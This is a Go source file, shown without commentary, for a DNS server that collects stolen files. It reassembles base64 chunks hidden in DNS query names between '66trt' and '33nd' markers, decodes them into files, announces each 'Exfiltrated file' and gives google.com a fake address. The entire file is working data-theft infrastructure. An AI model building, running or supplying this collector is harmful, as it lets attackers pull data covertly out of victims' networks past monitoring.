package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

var records = map[string]string{
	"test.service.": "192.168.0.2",
	"google.com.":   "192.168.0.2",
}

var buf bytes.Buffer

var writingGoingON = false
var filename = ""

func parseQuery(m *dns.Msg) {

	for _, q := range m.Question {
		if q.Qtype == dns.TypeA {
			//log.Printf("Query for %s\n", q.Name)

			//found new file marker
			if strings.HasPrefix(q.Name, "66trt") && !writingGoingON {
				filename = time.Now().Format("20060102150405")
				writingGoingON = true
				//trim header
				b64 := strings.Split(q.Name, ".")[0]
				WithOutHeader := strings.TrimPrefix(b64, "66trt")
				buf.WriteString(WithOutHeader)
				continue
			}

			if strings.HasSuffix(strings.Split(q.Name, ".")[0], "33nd") {
				b64 := strings.Split(q.Name, ".")[0]
				WithOuttrial := strings.TrimSuffix(b64, "33nd")
				//fmt.Print(WithOuttrial)
				buf.WriteString(WithOuttrial)
				writefile()
				writingGoingON = false
				buf.Reset()
				continue

			}

			if writingGoingON {
				buf.WriteString(strings.Split(q.Name, ".")[0])
			}

			ip := records[q.Name]
			if ip != "" {
				rr, err := dns.NewRR(fmt.Sprintf("%s A %s", q.Name, ip))
				if err == nil {
					m.Answer = append(m.Answer, rr)
				}
			}

		}
	}
}

func writefile() {
	//fmt.Print(buf.String())

	b, err := base64.StdEncoding.DecodeString(buf.String())
	if err != nil {
		fmt.Println(err)
	}
	ioutil.WriteFile(filename, b, 0644)
	fmt.Println("Exfiltrated file: " + filename)

}

func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)

	}

	w.WriteMsg(m)
}

func main() {
	// attach request handler func
	dns.HandleFunc("com.", handleDnsRequest)

	// start server
	port := 53
	server := &dns.Server{Addr: "0.0.0.0:" + strconv.Itoa(port), Net: "udp"}
	log.Printf("Starting at %d\n", port)
	err := server.ListenAndServe()
	defer server.Shutdown()
	if err != nil {
		log.Fatalf("Failed to start server: %s\n ", err.Error())
	}
}
